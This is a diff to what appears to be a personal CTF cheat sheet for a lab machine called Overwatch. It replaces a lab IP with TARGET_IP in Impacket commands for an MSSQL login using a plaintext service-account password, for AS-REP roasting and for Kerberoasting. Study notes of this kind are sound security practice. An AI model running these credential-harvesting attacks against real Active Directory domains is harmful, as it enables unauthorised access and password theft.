@@ -6,7 +6,7 @@ Python suite implementing Windows/AD network protocols (SMB, Kerberos, MSSQL, WM
 
 ### Interactive MSSQL session with Windows authentication
 ```bash
-impacket-mssqlclient overwatch.htb/sqlsvc:'TI0LKcfHzZw1Vv'@10.129.28.165 -port 6520 -windows-auth
+impacket-mssqlclient overwatch.htb/sqlsvc:'TI0LKcfHzZw1Vv'@TARGET_IP -port 6520 -windows-auth
 ```
 Used on: **Overwatch**
 
@@ -18,7 +18,7 @@ enum_owner
 
 ### AS-REP Roasting
 ```bash
-impacket-GetNPUsers overwatch.htb/ -usersfile users.txt -dc-ip 10.129.28.165 -no-pass -format hashcat
+impacket-GetNPUsers overwatch.htb/ -usersfile users.txt -dc-ip TARGET_IP -no-pass -format hashcat
 ```
 Used on: **Overwatch**
 
@@ -27,7 +27,7 @@ Used on: **Overwatch**
 
 ### Kerberoasting
 ```bash
-impacket-GetUserSPNs overwatch.htb/sqlsvc:'TI0LKcfHzZw1Vv' -dc-ip 10.129.28.165 -request
+impacket-GetUserSPNs overwatch.htb/sqlsvc:'TI0LKcfHzZw1Vv' -dc-ip TARGET_IP -request
 ```
 Used on: **Overwatch**
 
